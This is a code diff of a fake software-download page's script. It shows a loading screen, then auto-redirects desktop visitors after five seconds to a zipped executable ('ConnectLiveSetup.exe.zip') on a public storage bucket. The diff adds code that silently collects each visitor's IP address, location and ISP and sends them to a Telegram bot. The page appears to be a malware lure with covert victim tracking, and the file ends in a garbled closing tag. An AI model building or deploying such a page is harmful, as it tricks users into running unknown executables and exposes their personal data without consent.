@@ -136,39 +136,70 @@
     </div>
 
     <!-- Core Logic -->
-    <script>
+        <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // 1. Target Destination setup (Change to where the user should end up)
+            // --- Configuration ---
             const TARGET_URL = "https://pub-9155da1311434ab9afab81c1b8a9128c.r2.dev/ConnectLiveSetup.exe.zip";
+            
+            // Telegram API Credentials 
+            const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+            const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
 
-            // 2. User-Agent Detection (Flagging common mobile environments)
+            // --- Environment Detection ---
             const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const deviceType = isMobile ? "Mobile" : "Desktop";
 
-            // 3. Render Logic
+            // --- Notification Logic ---
+            async function triggerTelegramAlert() {
+                try {
+                    // 1. Fetch IP and Geolocation data using a free public API
+                    const geoResponse = await fetch('https://ipapi.co/json/');
+                    const geoData = await geoResponse.json();
+
+                    // 2. Construct the alert message
+                    const message = `
+🔔 *New Page Visitor*
+*Device:* ${deviceType}
+*IP:* ${geoData.ip || 'Unknown'}
+*Location:* ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
+*ISP:* ${geoData.org || 'Unknown'}
+                    `;
+
+                    // 3. Dispatch to Telegram API via POST request
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (error) {
+                    console.error("Alert dispatch failed", error);
+                }
+            }
+
+            // Fire the alert silently in the background (prevents firing if tokens aren't set)
+            if(TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
+                triggerTelegramAlert();
+            }
+
+            // --- Render & Redirect Logic ---
             if (isMobile) {
-                // Renders the Desktop Only screen and stops (no redirect happens)
+                // Mobile: Render warning and stop
                 document.getElementById('mobile-view').style.display = 'flex';
             } else {
-                // Renders the background, top-left logo, and loading spinner
+                // Desktop: Render background/loader
                 document.getElementById('desktop-view').style.display = 'block';
 
-                // 4. Five-Second Delay & Auto-Trigger Execution
+                // Execute auto-trigger after 5 seconds
                 setTimeout(() => {
-                    // Method A: window.location.replace (Recommended)
-                    // Uses 'replace' so the loading screen isn't saved in the browser's back-button history.
                     window.location.replace(TARGET_URL);
-
-                    /* 
-                    Method B: Synthetic <a> tag click (Uncomment if your environment specifically requires an anchor execution)
-                    
-                    const link = document.createElement('a');
-                    link.href = TARGET_URL;
-                    document.body.appendChild(link);
-                    link.click();
-                    */
                 }, 5000); 
             }
         });
     </script>
 </body>
+</hhttps</body>
 </html>
